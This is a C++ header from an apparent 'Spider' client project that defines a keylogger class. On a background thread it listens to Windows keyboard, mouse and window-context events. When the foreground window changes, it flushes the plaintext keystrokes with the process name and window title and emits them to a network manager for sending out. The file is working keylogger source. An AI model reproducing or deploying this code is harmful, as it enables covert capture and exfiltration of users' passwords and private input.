//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_SPIDERKEYLOGGER_HPP
#define SPIDER_CLIENT_SPIDERKEYLOGGER_HPP

#include <thread>
#include "ISpiderKeyLogger.hpp"
#include "IWindowsContextAgent.hpp"
#include "WindowsContextAgent.hpp"
#include "IWindowsKeyListener.hpp"
#include "WindowsKeyListener.hpp"
#include "IWindowsMouseListener.hpp"
#include "WindowsMouseListener.hpp"
#include "SpiderKeyLoggingPayload.pb.h"

class SpiderKeyLogger : public ISpiderKeyLogger {
private:
	std::unique_ptr<std::thread> _keyLoggerThread;
	std::unique_ptr<IWindowsContextAgent> ContextAgent = std::unique_ptr<IWindowsContextAgent>(std::make_unique<WindowsContextAgent>());
	std::unique_ptr<IWindowsKeyListener> KeyListener = std::unique_ptr<IWindowsKeyListener>(std::make_unique<WindowsKeyListener>());
	std::unique_ptr<ISpiderEventListener<SpiderContextChangedEvent>> _eventListener = std::unique_ptr<ISpiderEventListener<SpiderContextChangedEvent>>(std::make_unique<SpiderEventListener<SpiderContextChangedEvent>>());
	std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(std::make_unique<SpiderEventEmitter>());
	std::unique_ptr<IWindowsMouseListener> MouseListener = std::unique_ptr<IWindowsMouseListener>(std::make_unique<WindowsMouseListener>());

	std::unique_ptr<SpiderContextChangedEvent> _currentContext = nullptr;

	void RunKeyLogger() {
		_eventListener->Register("OnWindowsContextChanged", [&](std::string clientId, SpiderContextChangedEvent &newContext) {
			PushKeyLog(clientId);
			_currentContext = std::make_unique<SpiderContextChangedEvent>(newContext);
		});

		ContextAgent->Run();
		MouseListener->Run();
		KeyListener->Run(); //This will block current thread.
	}

	void PushKeyLog(std::string &clientId) const
	{
		SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload contextPayload;
		if (_currentContext != nullptr)
		{
			contextPayload.set_processname(_currentContext->processname());
			contextPayload.set_windowsname(_currentContext->windowtitle());
		}

		SpiderKeyLoggingPayload payload;
		payload.set_plaintextkeylog(KeyListener->Flush());
		payload.set_allocated_context(new SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload(contextPayload));

		auto enveloppe = SpiderSerializer::CreateResponseFromPayload(clientId, payload);
		_eventEmitter->Emit("SpiderNetworkManager", enveloppe);
		
	}

public:
	void Run() override final {
		_keyLoggerThread = std::make_unique<std::thread>(std::bind(&SpiderKeyLogger::RunKeyLogger, this));
	}
};

#endif //SPIDER_CLIENT_SPIDERKEYLOGGER_HPP